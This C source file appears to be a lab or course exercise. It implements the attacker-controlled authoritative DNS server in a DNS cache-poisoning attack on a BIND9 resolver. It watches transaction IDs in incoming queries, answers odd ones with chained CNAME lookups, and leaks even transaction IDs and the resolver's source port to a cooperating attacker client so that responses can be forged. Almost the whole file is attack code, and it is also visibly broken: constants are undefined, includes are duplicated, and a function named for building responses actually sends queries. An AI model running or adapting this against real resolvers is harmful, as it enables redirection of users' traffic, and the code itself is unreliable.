
#include <ldns/ldns.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

#define SERVER_PORT 53 // Port for the attacker's authoritative server
#define BUFFER_SIZE 512
#define SERVER_CLIENT_PORT 4444
#define CLIENT_UDP_PORT 4443
#define CLIENT_IP "192.168.1.202"
#define BIND9_IP "192.168.1.203"
#define QUERY_DOMAIN "www.attacker.cybercourse.com"
// Function to create a DNS response packet

#include <ldns/ldns.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int send_txid(int client_sock, uint32_t txid, uint16_t source_port);


// Function to build a DNS query for CNAME
int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid) {
    int query_len = 0;
    uint32_t txid = htons(tid); // Transaction ID
    unsigned short flags = htons(0x0100); // Standard query
    unsigned short q_count = htons(1);   // 1 question
    unsigned short ans_count = 0;        // No answers
    unsigned short auth_count = 0;       // No authority
    unsigned short add_count = 0;        // No additional

    // Header section
    memcpy(buffer + query_len, &txid, 2);
    query_len += 2;
    memcpy(buffer + query_len, &flags, 2);
    query_len += 2;
    memcpy(buffer + query_len, &q_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &ans_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &auth_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &add_count, 2);
    query_len += 2;

    // Question section (convert hostname to DNS format)
    char buffer2[512];
    strcpy(buffer2, hostname);
    const char *token = strtok((char *)buffer2, ".");
    while (token) {
        size_t len = strlen(token);
        buffer[query_len++] = (unsigned char)len;
        memcpy(buffer + query_len, token, len);
        query_len += len;
        token = strtok(NULL, ".");
    }

    buffer[query_len++] = 0; // End of hostname

    // Question Type (CNAME record)
    unsigned short qtype = htons(5); // Type CNAME (Canonical Name)
    memcpy(buffer + query_len, &qtype, 2);
    query_len += 2;

    // Question Class (IN)
    unsigned short qclass = htons(1); // Class IN (Internet)
    memcpy(buffer + query_len, &qclass, 2);
    query_len += 2;

    return query_len;
}

int create_dns_response(uint32_t txid, const char* query_name){
        // connect to server attacker
    int sockfd1;
    char txid_buffer[BUFFER_SIZE];
    // send the DNS request  ################ step 1 #####################
    const char *hostname = query_name;
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char buffer[BUFFER_SIZE];

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    // Step 2: Configure the DNS server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_SERVER_PORT);
    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
    printf("step 2 done\n");
    // Step 3: Build the DNS query
    int query_len = build_dns_query(buffer, hostname, 1234);
    printf("step 3 done\n");
    printf("buffer: %s\n", buffer);
    // Step 4: Send the DNS query
    if (sendto(sockfd, buffer, query_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to send DNS query");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("DNS query sent for hostname: %s\n", hostname);
    return 0;
}

// int create_dns_response(uint32_t txid, const char* query_name) {
//     ldns_pkt *packet = NULL;
//     ldns_rr *question_rr = NULL;
//     ldns_rr *answer_rr = NULL;

//     // Step 1: Create a new DNS packet
//     packet = ldns_pkt_new();
//     if (!packet) {
//         fprintf(stderr, "Failed to create a new packet.\n");
//         return EXIT_FAILURE;
//     }

//     // Step 2: Set the Transaction ID (TXID) and flags
//     ldns_pkt_set_id(packet, txid);   // Set the TXID
//     ldns_pkt_set_qr(packet, true);  // Set QR (Query/Response) flag to Response

//     // Step 3: Create the Question Section
//     ldns_rdf *domain = ldns_dname_new_frm_str(query_name);
//     if (!domain) {
//         fprintf(stderr, "Failed to create domain RDF.\n");
//         ldns_pkt_free(packet);
//         return EXIT_FAILURE;
//     }

//     question_rr = ldns_rr_new();
//     ldns_rr_set_owner(question_rr, domain);
//     ldns_rr_set_type(question_rr, LDNS_RR_TYPE_CNAME);  // Query type: CNAME
//     ldns_rr_set_class(question_rr, LDNS_RR_CLASS_IN);  // Query class: IN
//     ldns_pkt_push_rr(packet, LDNS_SECTION_QUESTION, question_rr);

//     // Step 4: Create the Answer Section using ldns_rr_new_frm_str
//     char answer_rr_str[256];
//     snprintf(answer_rr_str, sizeof(answer_rr_str), "%s 10 IN CNAME %s", query_name, query_name);

//     if (ldns_rr_new_frm_str(&answer_rr, answer_rr_str, (uint8_t) 3600, domain, NULL) != LDNS_STATUS_OK) {
//         fprintf(stderr, "Failed to create answer RR from string.\n");
//         ldns_pkt_free(packet);
//         ldns_rdf_deep_free(domain);
//         return EXIT_FAILURE;
//     }

//     // Add the answer RR to the packet
//     ldns_pkt_push_rr(packet, LDNS_SECTION_ANSWER, answer_rr);

//     // Step 5: Serialize the packet for transmission
//     uint8_t *wire_data = NULL;
//     size_t wire_size = 0;

//     if (ldns_pkt2wire(&wire_data, packet, &wire_size) != LDNS_STATUS_OK) {
//         fprintf(stderr, "Failed to serialize packet.\n");
//         ldns_pkt_free(packet);
//         ldns_rdf_deep_free(domain);
//         return EXIT_FAILURE;
//     }

//     // Step 6: Send the DNS response to the recursive resolver
//     int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
//     if (sockfd < 0) {
//         perror("Socket creation failed");
//         ldns_pkt_free(packet);
//         free(wire_data);
//         ldns_rdf_deep_free(domain);
//         return EXIT_FAILURE;
//     }

//     struct sockaddr_in resolver_addr;
//     memset(&resolver_addr, 0, sizeof(resolver_addr));
//     resolver_addr.sin_family = AF_INET;
//     resolver_addr.sin_port = htons(SERVER_PORT);
//     inet_pton(AF_INET, BIND9_IP, &resolver_addr.sin_addr);

//     if (sendto(sockfd, wire_data, wire_size, 0, (struct sockaddr *)&resolver_addr, sizeof(resolver_addr)) < 0) {
//         perror("Failed to send DNS response");
//     } else {
//         printf("Sent DNS response to resolver %s (TXID: %u).\n", BIND9_IP, txid);
//     }

//     // Step 7: Clean up
//     printf("hello\n");
//     close(sockfd);


//     return 0;
// }
// //##########################################################################################################


int even_odd_part(uint32_t txid, struct sockaddr_in client_addr, int* counter, int client_sock){

    // CHECK IF THE TXID IS ODD
    if (txid & 1){
        char response_n[30];
        sprintf(response_n, "ww%d.attacker.cybercourse.com", *counter);
        printf("%s\n",response_n);
        *counter += 1;
        create_dns_response(txid, response_n);
        return 0;
    }
    
    
    // check if the txid is even -> send TXID to the client
    else{
      uint16_t source_port = ntohs(client_addr.sin_port);
      printf("source port %u :\n", source_port);
      char* response_cname = "www.example.cybercourse.com";
      // Send the even txid to the client (send TXID)
      send_txid(client_sock, txid, source_port);
      create_dns_response(txid, response_cname);
      return 1;
    } 
}



//####################################################################################################################

int send_txid(int client_sock, uint32_t txid, uint16_t source_port){
    char buffer[BUFFER_SIZE];

    // TXID to send to the client (could be dynamically generated or static for simplicity)

    // Prepare the message to send to the client
    snprintf(buffer, sizeof(buffer), "TXID: %u, PORT: %u", txid, source_port);

    // Send the TXID to the client
    if (send(client_sock, buffer, strlen(buffer), 0) < 0) {
        perror("Failed to send data to client");
        close(client_sock);
        return EXIT_FAILURE;
    }

    printf("Sent TXID to client: %u\n, port: %u", txid, source_port);
    
    // Close the connection after sending the response
    close(client_sock);
    return 0;
}

int connect_to_client(){
    int sockfd;//, client_sock;
    struct sockaddr_in server_addr;//, client_addr;
    //socklen_t client_addr_len = sizeof(client_addr);

    // Step 1: Create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Step 2: Configure the server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_CLIENT_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;  // Listen on all interfaces

    // Step 3: Bind the socket to the server address
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Step 4: Listen for incoming connections
    if (listen(sockfd, 5) < 0) {
        perror("Listen failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Server listening on port %d...\n", SERVER_CLIENT_PORT);
    return sockfd;
}


int main() {
    int client_sock;
    struct sockaddr_in client_addr1;
    socklen_t client_addr_len1 = sizeof(client_addr1);
    int status = connect_to_client();
    if (status < 0){
      printf("Failed to connect to client attacker\n");
      return EXIT_FAILURE;
    }
    client_sock = accept(status, (struct sockaddr *)&client_addr1, &client_addr_len1);
    if (client_sock < 0) {
        perror("Accept failed");
        return EXIT_FAILURE;

    }

    printf("Client connected: %s:%d\n", inet_ntoa(client_addr1.sin_addr), ntohs(client_addr1.sin_port));




    struct sockaddr_in server_addr, client_addr;
    char buffer[BUFFER_SIZE];
    socklen_t addr_len = sizeof(client_addr);


    // Create a UDP socket
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Configure the server address
    memset(&server_addr, 0, sizeof(server_addr));
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);

    // Bind the socket to the server address
    int bind_res = bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
    if (bind_res < 0) {
        perror("Bind failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    int counter = 0;
    printf("Authoritative name server running on port %d...\n", SERVER_PORT);
    int even_found = 0;
    // Receive a DNS query
    while (!even_found) {
        //client_addr will save the data of the sender, the received data will be saved in buffer
        int n = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&client_addr, &addr_len);
        if (n < 0 || n < 12) {
            printf("n < 12 \n");
            perror("Failed to receive data");
            continue;
        }

        // convert the data to a DNS packet
        ldns_pkt *query_pkt = NULL;
        if (ldns_wire2pkt(&query_pkt, (uint8_t *)buffer, n) != LDNS_STATUS_OK) {
            fprintf(stderr, "Failed to parse DNS query\n");
            continue;
        }

        // extract the txid
        uint32_t txid = ldns_pkt_id(query_pkt);
        printf("Received query with TXID: %u \n", txid);

        even_found = even_odd_part(txid, client_addr, &counter, client_sock);

  }
}
